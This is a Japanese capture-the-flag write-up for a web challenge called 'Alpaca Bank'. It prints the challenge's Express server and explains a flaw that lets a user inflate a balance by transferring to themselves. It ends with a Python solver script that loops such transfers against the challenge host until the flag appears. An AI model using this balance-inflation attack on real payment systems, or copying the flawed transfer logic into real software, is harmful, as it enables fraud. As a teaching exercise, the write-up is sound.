# Alpaca Bank ( 2025/12/11 )
## Description
🦙 < 銀行を作ってみるパカ!

- NOTE1: この問題を解くためには、大量のアカウントを作成する必要はありません。過度なリクエストはお控えください。
- NOTE2: この問題は trillion bank - SECCON CTF 13 Quals のオマージュですが、元問題の知識は不要です。
## Solve
配布されるapp.jsは以下の通りです。
``` js
const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();

const FLAG = process.env.FLAG ?? "Alpaca{**** REDACTED ****}";
const TRILLION = 1_000_000_000_000;

app.use(express.json());

const users = new Set();
const balances = new Map();

app.post('/api/register', (req, res) => {
    const id = crypto.randomBytes(10).toString('hex');
    users.add(id);
    balances.set(id, 10); // Initial balance
    res.status(201).json({ user: id });
});

app.get('/api/user/:user', (req, res) => {
    const user = req.params.user;
    if (!users.has(user)) return res.status(404).send({ error: 'User not found' });
    res.status(200).json({
        user: user,
        balance: balances.get(user),
        flag: balances.get(user) >= TRILLION ? FLAG : null // 🚩
    });
});

app.post('/api/transfer', (req, res) => {
    const { fromUser, toUser, amount } = req.body;

    if (!Number.isInteger(amount) || amount <= 0) {
        return res.status(400).send({ error: 'Invalid amount' });
    }
    if (!users.has(fromUser) || !users.has(toUser)) {
        return res.status(400).send({ error: 'Invalid user ID' });
    }

    const fromBalance = balances.get(fromUser);
    const toBalance = balances.get(toUser);
    if (fromBalance < amount) {
        return res.status(400).send({ error: 'Insufficient funds' });
    }
    
    balances.set(fromUser, fromBalance - amount);
    balances.set(toUser, toBalance + amount);

    res.status(200).json({
        receipt: `${fromUser} -> ${toUser} (${amount} yen)`
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(3000, () => {
    console.log('Server listening on port 3000');
});
```
基本的な構造は、RegisterでランダムなIDが作られ、/api/transferではfromUserからtoUserへ指定したamountが送られる、といったものです。ここで着目すべきは、fromUserとtoUserに関するエスケープがないことと、balanceの書き換えにsetが使われていることです。
まず、fromUserとtoUserに対するエスケープが存在しないため、自分から自分へ送る、といった状況が成立してしまいます。また、その残高更新の処理を見てみると、
``` js
    balances.set(fromUser, fromBalance - amount);
    balances.set(toUser, toBalance + amount);
```
となっています。処理を順に追うと、まず(fromUserの残高) = (元) - (金額)とした後、(toUserの残高) = (元) + (金額)としています。ここで、
```json
{
    'fromUser':'AAAA'
    'toUser':'AAAA'
    'amount':10
}
```
となった場合について考えると、最初に`balances.set(fromUser, fromBalance - amount);`によって、
```
AAAA -= 10
```
となり、その後`balances.set(toUser, toBalance + amount);`によって、
```
AAAA += 10
```
となるため、最終的にAAAAの残高は10増加してしまいます。ここで、FLAGの獲得条件を探すと、
```js
        flag: balances.get(user) >= TRILLION ? FLAG : null // 🚩
```
より、自分の残高が1兆を越えればよいことがわかります。したがって、自分で自分に残高を送り続けて残高を増やし、1兆を超えたところで確認すればFLAGを得られます。
## Solver
```
import requests
URL = 'http://34.170.146.252:27241/'
ID = '2e86c618cbc589aec679'

am = 10

while True:
    data = {'fromUser':ID, 'toUser':ID, 'amount':am}
    r = requests.post(URL+'api/transfer', json=data)
    print('Amount:',am)
    print(r.text)
    if am >= 1000000000000:
        break
    am += am
r = requests.get(URL+'api/user/'+ID)
print(r.text)
```